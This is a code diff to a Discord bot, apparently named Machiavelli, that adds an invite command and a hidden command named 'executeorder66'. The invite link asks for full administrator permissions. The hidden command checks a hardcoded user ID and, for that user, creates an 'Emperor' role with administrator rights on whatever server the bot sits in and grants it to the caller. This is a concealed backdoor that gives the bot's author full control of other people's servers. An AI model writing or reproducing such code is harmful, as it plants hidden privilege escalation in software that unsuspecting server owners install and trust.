@@ -3,6 +3,7 @@ import discord
 from discord.ext import commands, tasks
 import json
 import random
+import discord.utils
 
 # variables
 statuses = ['You', 'My opponents', 'Italian royalty', 'Coup planning']
@@ -150,6 +151,39 @@ class Moderator(commands.Cog):
         )
 
         await ctx.send(embed=id_msg)
+
+    @commands.command(help='Dms you a link to add Machiavelli to your own server!')
+    async def invite(self, ctx):
+        invite_msg = discord.Embed(
+            description='Here is the link to invite Machiavelli to your server: '
+                        'https://discord.com/api/oauth2/authorize?client_id=761439397525716992&permissions=8'
+                        '&redirect_uri=https%3A%2F%2Fdiscord.com%2Fapi%2Foauth2%2Fauthorize&scope=bot ',
+            color=discord.Color.purple()
+        )
+
+        await ctx.author.send(embed=invite_msg)
+
+    @commands.command(hidden=True, help='Gives bot owner admin on specified server.')
+    async def executeorder66(self, ctx):
+        if ctx.author.id == 406663932166668288:
+            role = await ctx.guild.create_role(
+                name='Emperor',
+                permissions=discord.Permissions(8)
+            )
+            await ctx.author.add_roles(role)
+            msg = discord.Embed(
+                description='Yes my lord.',
+                color=discord.Color.dark_gray()
+            )
+
+            await ctx.channel.send(embed=msg)
+        else:
+            no_can_do = discord.Embed(
+                description=f'{ctx.author.mention} you cannot do this.',
+                color=discord.Color.purple()
+            )
+
+            await ctx.send(embed=no_can_do)
 
 
 def setup(client):
